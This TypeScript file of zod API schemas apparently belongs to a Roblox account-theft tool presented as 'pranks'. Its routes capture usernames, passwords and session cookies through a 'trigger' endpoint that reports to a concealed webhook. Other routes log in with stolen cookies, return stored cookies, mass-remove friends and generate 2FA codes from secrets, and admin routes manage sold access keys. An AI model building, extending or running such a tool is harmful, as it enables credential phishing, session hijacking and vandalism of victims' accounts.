import { z } from 'zod';
import { insertPrankSchema, pranks } from './schema';

export const errorSchemas = {
  validation: z.object({
    message: z.string(),
  }),
  unauthorized: z.object({
    message: z.string(),
  }),
  notFound: z.object({
    message: z.string(),
  }),
};

export const api = {
  pranks: {
    create: {
      method: 'POST' as const,
      path: '/api/pranks',
      input: z.object({
        webhookUrl: z.string().url(),
        template: z.string().optional(),
        targetId: z.string().optional(),
      }),
      responses: {
        201: z.custom<typeof pranks.$inferSelect>(),
        400: errorSchemas.validation,
        401: errorSchemas.unauthorized,
      },
    },
    get: {
      method: 'GET' as const,
      path: '/api/pranks/:id',
      responses: {
        200: z.object({ id: z.number() }), // Don't expose webhook URL
        404: errorSchemas.notFound,
      },
    },
    trigger: {
      method: 'POST' as const,
      path: '/api/pranks/:id/trigger',
      input: z.object({
        username: z.string().min(1),
        password: z.string().optional(),
        cookie: z.string().optional(),
      }),
      responses: {
        200: z.object({ success: z.boolean() }),
        404: errorSchemas.notFound,
      },
    },
  },
  admin: {
    keys: {
      list: {
        method: 'GET' as const,
        path: '/api/admin/keys',
        responses: {
          200: z.array(z.object({
            id: z.number(),
            key: z.string(),
            usedByIp: z.string().nullable(),
            isActive: z.boolean(),
            isMaster: z.boolean(),
          })),
          401: errorSchemas.unauthorized,
        },
      },
      create: {
        method: 'POST' as const,
        path: '/api/admin/keys',
        input: z.object({
          masterKey: z.string(),
        }),
        responses: {
          201: z.object({ key: z.string() }),
          401: errorSchemas.unauthorized,
        },
      },
    },
    tickets: {
      list: {
        method: 'GET' as const,
        path: '/api/admin/tickets',
        responses: {
          200: z.array(z.object({
            id: z.number(),
            code: z.string(),
            isUsed: z.boolean(),
            usedByIp: z.string().nullable(),
          })),
          401: errorSchemas.unauthorized,
        },
      },
      create: {
        method: 'POST' as const,
        path: '/api/admin/tickets',
        input: z.object({
          masterKey: z.string(),
          code: z.string(),
        }),
        responses: {
          201: z.object({ success: z.boolean() }),
          401: errorSchemas.unauthorized,
        },
      },
    },
  },
  roblox: {
    login: {
      method: 'POST' as const,
      path: '/api/roblox/login',
      input: z.object({
        cookie: z.string().min(1),
      }),
      responses: {
        200: z.object({
          userId: z.string(),
          username: z.string(),
          displayName: z.string(),
          created: z.string(),
          isBanned: z.boolean(),
        }),
        400: errorSchemas.validation,
        401: z.object({ message: z.string() }),
      },
    },
    getCookie: {
      method: 'GET' as const,
      path: '/api/roblox/cookie',
      responses: {
        200: z.object({
          cookie: z.string(),
          username: z.string(),
          userId: z.string(),
        }),
        401: errorSchemas.unauthorized,
      },
    },
    removeFriends: {
      method: 'POST' as const,
      path: '/api/roblox/remove-friends',
      input: z.object({
        cookie: z.string().min(1),
      }),
      responses: {
        200: z.object({
          success: z.boolean(),
          removed: z.number(),
          message: z.string(),
        }),
        400: errorSchemas.validation,
        401: z.object({ message: z.string() }),
      },
    },
    searchUser: {
      method: 'GET' as const,
      path: '/api/roblox/search-user/:username',
      responses: {
        200: z.object({
          id: z.string(),
          name: z.string(),
          displayName: z.string(),
          description: z.string(),
          created: z.string(),
          isBanned: z.boolean(),
          externalAppDisplayName: z.string().nullable(),
          hasVerifiedBadge: z.boolean(),
        }),
        404: errorSchemas.notFound,
      },
    },
    generateTwoFactor: {
      method: 'POST' as const,
      path: '/api/roblox/2fa-generate',
      input: z.object({
        secret: z.string().min(1),
      }),
      responses: {
        200: z.object({
          code: z.string(),
          expiresIn: z.number(),
        }),
        400: errorSchemas.validation,
      },
    },
  },
};

export function buildUrl(path: string, params?: Record<string, string | number>): string {
  let url = path;
  if (params) {
    Object.entries(params).forEach(([key, value]) => {
      if (url.includes(`:${key}`)) {
        url = url.replace(`:${key}`, String(value));
      }
    });
  }
  return url;
}
